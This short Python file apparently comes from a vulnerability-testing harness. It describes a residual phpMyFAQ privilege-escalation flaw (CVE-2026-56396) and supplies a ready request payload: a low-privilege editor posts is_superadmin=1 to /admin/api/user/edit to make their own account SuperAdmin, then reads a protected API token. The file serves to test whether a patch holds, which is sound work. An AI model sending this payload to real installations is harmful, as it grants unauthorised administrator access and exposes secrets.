#!/usr/bin/env python3
"""[RESIDUAL] CVE-2026-56396 residual exploit descriptor for phpmyfaq-cve-2026-56396.

The 4.1.3 fix for CVE-2026-35671 guarded ONLY overwritePassword(). The SIBLING admin-API
method `editUser()` (route POST admin/api/user/edit) was left byte-identical to 4.1.2 --
still no object-level authorization check, and it still ran `$user->setSuperAdmin((bool)
$isSuperAdmin)` from request input unconditionally. This is CVE-2026-56396
(GHSA-985r-q3qp-299h), the incomplete-fix residual, closed only in 4.1.4.

Residual chain (same low-priv 'editor' user-administrator, same delegable rights): via
editUser() the attacker mass-assigns `is_superadmin=1` on their OWN account. On V1 there
is NO guard, so setSuperAdmin(true) runs -> the editor becomes a SuperAdmin -> on the next
request it may read the SuperAdmin-only REST-API client token (the canary). On V2 (4.1.4)
editUser() rejects a non-SuperAdmin setting is_superadmin (403), so the escalation -- and
the flag -- are blocked.
"""


def candidate() -> dict:
    return {
        "probe_id": "cve-2026-56396-edituser-superadmin-massassign",
        "endpoint": "/admin/api/user/edit",
        "mode": "self_escalate",      # session becomes SuperAdmin, then read the token
        "target": "self",             # seed_exec fills userId with the editor's real uid
        "json": {
            "is_superadmin": "1",     # mass-assignment the sibling endpoint never guards on V1
            "display_name": "Editor",
            "email": "editor@example.test",
            "user_status": "active",
            "last_modified": "2026-01-01 00:00:00",
            "overwrite_twofactor": "off",
        },
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
